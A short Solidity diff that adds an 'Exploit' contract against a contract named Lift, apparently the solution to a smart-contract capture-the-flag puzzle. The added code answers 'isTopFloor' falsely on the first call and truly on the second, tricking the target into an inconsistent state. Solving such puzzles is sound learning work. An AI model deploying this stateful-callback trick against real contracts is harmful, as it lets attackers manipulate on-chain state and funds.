@@ -19,3 +19,19 @@ contract Lift {
         }
     }
 }
+
+contract Exploit is House {
+    uint8 k = 0;
+
+    function attack(Lift instance) external {
+        instance.goToFloor(10);
+    }
+    function isTopFloor(uint256) external returns (bool) {
+        if (k == 0) {
+            k += 1;
+            return false;
+        } else {
+            return true;
+        }
+    }
+}
